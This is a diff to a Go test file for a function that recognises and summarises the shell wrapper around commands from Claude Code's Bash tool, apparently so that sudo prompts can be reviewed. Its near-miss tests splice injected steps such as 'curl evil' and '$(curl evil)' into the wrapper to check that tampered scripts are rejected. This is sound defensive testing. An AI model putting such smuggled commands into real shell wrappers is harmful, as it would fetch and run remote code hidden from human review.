@@ -19,16 +19,32 @@ var capturedClaudeCode = []string{
 : sudo -A apt-get install -y make && echo '"'"'it'"'"'\'"'"''"'"'s done'"'"'' < /dev/null && pwd -P >| /tmp/claude-521a-cwd`,
 }
 
+// capturedClaudeCodeWhich is a "Run from" script from Claude Code 2.1.318,
+// which unaliases 'which' as well as 'unsetenv'.
+var capturedClaudeCodeWhich = []string{
+	`/bin/bash`,
+	`-c`,
+	`source /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1793870095338-v3kld4.sh 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && { \builtin unalias -- 'which'; \builtin unset -f -- 'which'; } >/dev/null 2>&1 || true && { \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true && eval '~/Cloud/dev/freedom-vpn/install packages 2>&1 | tail -40' < /dev/null && pwd -P >| /tmp/claude-a5f9-cwd`,
+}
+
 // claudeCodeWrap wraps script the way an earlier Claude Code release did,
 // without the stdin redirect.
 func claudeCodeWrap(script string) []string {
-	return []string{"/bin/bash", "-c", `source /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && { \builtin unalias -- 'unsetenv'; \builtin unset -f -- 'unsetenv'; } >/dev/null 2>&1 || true && eval '` +
-		strings.ReplaceAll(script, "'", `'"'"'`) + `' && pwd -P >| /tmp/claude-1f2e-cwd`}
+	return claudeCodeWrapUnsets(script, unsetBlock("unsetenv", "unsetenv"))
+}
+
+func claudeCodeWrapUnsets(script string, blocks ...string) []string {
+	return []string{"/bin/bash", "-c", `source /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh 2>/dev/null || true && shopt -u extglob 2>/dev/null || true && ` +
+		strings.Join(blocks, "") + `eval '` + strings.ReplaceAll(script, "'", `'"'"'`) + `' && pwd -P >| /tmp/claude-1f2e-cwd`}
+}
+
+func unsetBlock(alias, function string) string {
+	return `{ \builtin unalias -- '` + alias + `'; \builtin unset -f -- '` + function + `'; } >/dev/null 2>&1 || true && `
 }
 
 func TestDescribeInvokerClaudeCode(t *testing.T) {
 	got := DescribeInvoker(capturedClaudeCode)
-	want := `Claude Code Bash tool (sources /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1791292110979-fs0iwp.sh, stdin from /dev/null), script:
+	want := `Claude Code Bash tool (sources /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1791292110979-fs0iwp.sh; unsets unsetenv; stdin from /dev/null), script:
 
 cat /proc/$$/cmdline > /home/lllamnyp/.claude/jobs/380b1c5e/tmp/capture2.bin
 : sudo -A apt-get update
@@ -42,7 +58,32 @@ cat /proc/$$/cmdline > /home/lllamnyp/.claude/jobs/380b1c5e/tmp/capture2.bin
 
 	script := "sudo -A apt-get update\nsudo -A apt-get install -y make\necho 'done'\n"
 	got = DescribeInvoker(claudeCodeWrap(script))
-	want = "Claude Code Bash tool (sources /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh), script:\n\n" + script
+	want = "Claude Code Bash tool (sources /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh; unsets unsetenv), script:\n\n" + script
+	if got.Review != want {
+		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
+	}
+}
+
+func TestDescribeInvokerClaudeCodeUnsets(t *testing.T) {
+	got := DescribeInvoker(capturedClaudeCodeWhich)
+	want := `Claude Code Bash tool (sources /home/lllamnyp/.claude/shell-snapshots/snapshot-bash-1793870095338-v3kld4.sh; unsets which, unsetenv; stdin from /dev/null), script:
+
+~/Cloud/dev/freedom-vpn/install packages 2>&1 | tail -40`
+	if got.Review != want {
+		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
+	}
+
+	got = DescribeInvoker(claudeCodeWrapUnsets("sudo -A true",
+		unsetBlock("unsetenv", "unsetenv"), unsetBlock("_x9", "_x9"), unsetBlock("which", "which")))
+	want = "Claude Code Bash tool (sources /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh; unsets unsetenv, _x9, which), script:\n\nsudo -A true"
+	if got.Review != want {
+		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
+	}
+
+	// A wrapper-looking block inside the command is part of the command.
+	fake := unsetBlock("ls", "ls") + "sudo -A true"
+	got = DescribeInvoker(claudeCodeWrap(fake))
+	want = "Claude Code Bash tool (sources /home/agent/.claude/shell-snapshots/snapshot-bash-1-abc.sh; unsets unsetenv), script:\n\n" + fake
 	if got.Review != want {
 		t.Errorf("review:\n%s\nwant:\n%s", got.Review, want)
 	}
@@ -109,6 +150,14 @@ func TestDescribeInvokerNearMiss(t *testing.T) {
 		strings.Replace(wrapped, "true && shopt", "true && curl evil; shopt", 1),
 		strings.Replace(wrapped, "eval 'sudo", "eval \"$(curl evil)\" 'sudo", 1),
 		strings.Replace(wrapped, "/tmp/claude-1f2e-cwd", "/tmp/claude-1f2e-cwd; curl evil", 1),
+		claudeCodeWrapUnsets("sudo -A true")[2],
+		claudeCodeWrapUnsets("sudo -A true", unsetBlock("which", "sudo"))[2],
+		claudeCodeWrapUnsets("sudo -A true", unsetBlock("which", "which"), unsetBlock("unsetenv", "sudo"))[2],
+		claudeCodeWrapUnsets("sudo -A true", unsetBlock("which", "which"), unsetBlock("$(curl evil)", "$(curl evil)"))[2],
+		claudeCodeWrapUnsets("sudo -A true", unsetBlock("a-b", "a-b"))[2],
+		claudeCodeWrapUnsets("sudo -A true", unsetBlock("9x", "9x"))[2],
+		claudeCodeWrapUnsets("sudo -A true", unsetBlock("", ""))[2],
+		strings.Replace(wrapped, "|| true && eval", "|| true && curl evil; eval", 1),
 	} {
 		got := DescribeInvoker([]string{"/bin/bash", "-c", script})
 		if strings.HasPrefix(got.Review, "Claude Code") {
